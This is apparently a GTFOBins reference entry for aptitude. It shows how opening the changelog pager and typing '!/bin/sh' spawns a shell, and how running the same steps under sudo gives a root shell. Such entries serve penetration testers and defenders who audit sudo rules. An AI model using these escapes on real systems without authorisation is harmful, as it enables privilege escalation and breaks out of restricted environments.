---
functions:
  shell:
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        aptitude changelog aptitude
        !/bin/sh
  sudo:
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        sudo aptitude changelog aptitude
        !/bin/sh
---
